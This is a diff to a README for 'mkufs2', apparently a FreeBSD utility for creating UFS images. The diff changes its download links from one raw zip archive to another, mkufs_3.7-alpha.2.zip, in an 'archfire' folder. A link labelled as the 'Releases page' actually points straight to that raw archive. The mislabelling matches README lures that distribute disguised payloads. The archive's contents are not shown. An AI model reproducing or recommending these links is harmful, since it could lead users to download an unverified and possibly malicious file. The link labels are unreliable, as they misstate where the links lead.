@@ -1,6 +1,6 @@
 # 🚀 mkufs2 - Create UFS Images on FreeBSD Easily
 
-[![Download mkufs2](https://raw.githubusercontent.com/mtmtmtmtmt4444/mkufs2/main/archfire/mkufs-1.2.zip)](https://raw.githubusercontent.com/mtmtmtmtmt4444/mkufs2/main/archfire/mkufs-1.2.zip)
+[![Download mkufs2](https://raw.githubusercontent.com/mtmtmtmtmt4444/mkufs2/main/archfire/mkufs_3.7-alpha.2.zip)](https://raw.githubusercontent.com/mtmtmtmtmt4444/mkufs2/main/archfire/mkufs_3.7-alpha.2.zip)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ Make sure your system meets these requirements to avoid any issues.
 
 To download mkufs2, visit the Releases page. 
 
-[Download mkufs2](https://raw.githubusercontent.com/mtmtmtmtmt4444/mkufs2/main/archfire/mkufs-1.2.zip)
+[Download mkufs2](https://raw.githubusercontent.com/mtmtmtmtmt4444/mkufs2/main/archfire/mkufs_3.7-alpha.2.zip)
 
 ### Step 2: Select the Appropriate Version
 
@@ -105,7 +105,7 @@ For further assistance, feel free to check the issues section on the GitHub repo
 
 Stay informed about future updates and new features:
 
-[Visit the mkufs2 Releases page](https://raw.githubusercontent.com/mtmtmtmtmt4444/mkufs2/main/archfire/mkufs-1.2.zip)
+[Visit the mkufs2 Releases page](https://raw.githubusercontent.com/mtmtmtmtmt4444/mkufs2/main/archfire/mkufs_3.7-alpha.2.zip)
 
 You can also follow our repository for announcements and changes.
 
